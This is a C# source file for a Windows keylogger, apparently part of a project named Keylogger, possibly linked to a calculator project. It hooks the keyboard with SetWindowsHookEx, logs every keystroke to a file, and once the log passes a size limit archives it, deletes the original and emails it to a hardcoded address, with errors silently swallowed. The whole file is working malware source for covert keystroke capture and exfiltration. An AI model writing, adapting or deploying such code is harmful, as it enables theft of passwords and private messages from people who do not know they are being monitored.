using System;
using System.Runtime.InteropServices;
using System.Diagnostics;
using System.Windows.Forms;
using System.IO;
using System.Net.Mail;
using System.Net;
using Keylogger.DTO;
using Kalculator.BLL;

namespace Keylogger.BLL
{
    public static class SettingBLL
    {
        public static String DateTimeNow()
        {   
            String s=  Convert.ToString(DateTime.Now);
            String st = "";
            foreach (Char i in s)
                if (Char.IsLetter(i) || Char.IsNumber(i))
                {
                    st += i;
                }
                else st += '_';
            return st+".txt";
        }

        public static Setting setting= new Setting(@"E:\system_log.txt", 200);

        public static bool StartKeylogger=false;

        public static int MAX_KEYSTROKES_BEFORE_WRITING_TO_LOG = 0;

        public static int WH_KEYBOARD_LL = 13;
        public static int WM_KEYDOWN = 0x0100;
        public static LowLevelKeyboardProc llkProcedure = HookCallback;
        public static string buffer = "";

        public static bool state= true;
        public static string address= "jiang.hongyan@outlook.com.vn";


        public static void SetRun(Setting st, bool State, String Address)
        {
            setting.LOG_FILE_NAME = st.LOG_FILE_NAME;
            setting.MAX_LOG_LENGTH_BEFORE_SENDING_EMAIL = st.MAX_LOG_LENGTH_BEFORE_SENDING_EMAIL;
            state = State;
            address = Address;
        }

        public delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);

        public static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {

            if (buffer.Length >= MAX_KEYSTROKES_BEFORE_WRITING_TO_LOG) //start
            {
                StreamWriter output = new StreamWriter(setting.LOG_FILE_NAME, true);
                output.Write(buffer);
                output.Close();
                buffer = "";
            }

            FileInfo logFile = new FileInfo(setting.LOG_FILE_NAME);

            // Archive and email the log file if the max size has been reached
            if (logFile.Exists && logFile.Length >= setting.MAX_LOG_LENGTH_BEFORE_SENDING_EMAIL) //start
            {
                try
                {
                    // Copy the log file to the archive
                    int len = setting.LOG_FILE_NAME.Length;
                    String path = setting.LOG_FILE_NAME.Substring(0, len-4) + "-" + DateTimeNow();
                    logFile.CopyTo(path, true);

                    // Delete the log file
                    logFile.Delete();

                    //send mail
                    if (state == true) OutlookBLL.Send(path, address);

                }
                catch (Exception e)
                {
                }
            }

            if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
            {
                int vkCode = Marshal.ReadInt32(lParam);
                if (((Keys)vkCode).ToString() == "OemPeriod")
                {
                   
                    buffer += ".";
                }
                else if (((Keys)vkCode).ToString() == "Oemcomma")
                {
                    buffer += ",";
                }
                else if (((Keys)vkCode).ToString() == "Space")
                {
                    buffer += " ";
                }
                else if (((Keys)vkCode).ToString() == "D1")
                {
                    buffer += "1";
                }
                else if (((Keys)vkCode).ToString() == "D2")
                {
                    buffer += "2";
                }
                else if (((Keys)vkCode).ToString() == "D3")
                {
                    buffer += "3";
                }
                else if (((Keys)vkCode).ToString() == "D4")
                {
                    buffer += "4";
                }
                else if (((Keys)vkCode).ToString() == "D5")
                {
                    buffer += "5";
                }
                else if (((Keys)vkCode).ToString() == "D6")
                {
                    buffer += "6";
                }
                else if (((Keys)vkCode).ToString() == "D7")
                {
                    buffer += "7";
                }
                else if (((Keys)vkCode).ToString() == "D8")
                {
                    buffer += "8";
                }
                else if (((Keys)vkCode).ToString() == "D9")
                {
                    buffer += "9";
                }
                else if (((Keys)vkCode).ToString() == "D0")
                {
                    buffer += "0";
                }
                else if (((Keys)vkCode).ToString() == "Escape")
                {
                    buffer += "{esc}";
                }

                else
                {
                    buffer += (Keys)vkCode;
                }
            }

            return CallNextHookEx(IntPtr.Zero, nCode, wParam, lParam);
        }



        public static IntPtr SetHook(LowLevelKeyboardProc proc)
        {
            Process currentProcess = Process.GetCurrentProcess();
            ProcessModule currentModule = currentProcess.MainModule;
            String moduleName = currentModule.ModuleName;
            IntPtr moduleHandle = GetModuleHandle(moduleName);
            return SetWindowsHookEx(WH_KEYBOARD_LL, llkProcedure, moduleHandle, 0);
        }

        [DllImport("user32.dll")]
        public static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

        [DllImport("user32.dll")]
        public static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

        [DllImport("user32.dll")]
        public static extern bool UnhookWindowsHookEx(IntPtr hhk);

        [DllImport("kernel32.dll")]
        public static extern IntPtr GetModuleHandle(String lpModuleName);
    }
}
